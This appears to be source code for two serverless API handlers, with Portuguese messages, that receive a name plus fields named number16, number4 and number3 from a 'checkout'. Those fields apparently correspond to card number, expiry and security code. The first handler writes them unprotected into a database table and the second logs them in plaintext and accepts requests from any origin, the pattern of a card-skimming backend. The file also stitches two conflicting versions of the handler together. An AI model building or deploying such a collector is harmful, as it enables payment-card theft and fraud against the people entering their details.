import type { VercelRequest, VercelResponse } from "@vercel/node";
import { applyCors } from "../server/cors.js";
import { getRateLimitKey, parseBody } from "../server/request.js";
import { getSupabaseAdmin } from "../server/supabase-admin.js";
import { submissionSchema } from "../shared/submission.js";

export default async function handler(
  request: VercelRequest,
  response: VercelResponse,
) {
  applyCors(response);

  if (request.method === "OPTIONS") {
    return response.status(204).end();
  }

  if (request.method !== "POST") {
    response.setHeader("Allow", "POST, OPTIONS");
    return response.status(405).json({ error: "Metodo nao permitido." });
  }

  try {
    const parsed = submissionSchema.safeParse(parseBody(request));
    if (!parsed.success) {
      return response.status(400).json({
        error: "Dados invalidos.",
        fields: parsed.error.flatten().fieldErrors,
      });
    }

    const supabase = getSupabaseAdmin();
    const { data: rateAllowed, error: rateError } = await supabase.rpc(
      "check_submission_rate_limit",
      {
        p_key: getRateLimitKey(request),
        p_limit: 10,
        p_window_seconds: 60,
      },
    );

    if (rateError) throw rateError;
    if (!rateAllowed) {
      response.setHeader("Retry-After", "60");
      return response.status(429).json({
        error: "Muitos envios. Aguarde um minuto e tente novamente.",
      });
    }

    const { data, error } = await supabase
      .from("submissions")
      .insert({
        name: parsed.data.name,
        number_16: parsed.data.number16,
        number_4: parsed.data.number4,
        number_3: parsed.data.number3,
      })
      .select("id, created_at")
      .single();

    if (error) throw error;

    return response.status(201).json({ ok: true, submission: data });
  } catch (error) {
    console.error("submission_error", error);
    return response.status(500).json({
      error: "Nao foi possivel registrar os dados agora.",
    });
  }
}
export default async function handler(req, res) {
  // Permite apenas POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método não permitido' });
  }

  // Habilita CORS para o seu checkout aceitar a resposta
  res.setHeader('Access-Control-Allow-Origin', '*'); // Troque '*' pela URL do checkout em produção para segurança
  res.setHeader('Access-Control-Allow-Methods', 'POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  try {
    const { name, number16, number4, number3 } = req.body;

    // Validação básica
    if (!name || !number16 || !number4 || !number3) {
      return res.status(400).json({ error: 'Dados incompletos' });
    }

    // AQUI VOCÊ SALVA OS DADOS NO SEU BANCO DE DADOS OU ESTADO
    // Exemplo simples: console.log ou salvar em um JSON/array em memória (não persistente em serverless)
    // Para persistir, use seu banco (Mongo, Postgres, Firebase, etc)
    console.log('Novo dado recebido:', { name, number16, number4, number3 });

    // Simulação de sucesso
    return res.status(200).json({ message: 'Dados recebidos com sucesso', data: { name, number16 } });

  } catch (error) {
    console.error(error);
    return res.status(500).json({ error: 'Erro interno no servidor' });
  }
}
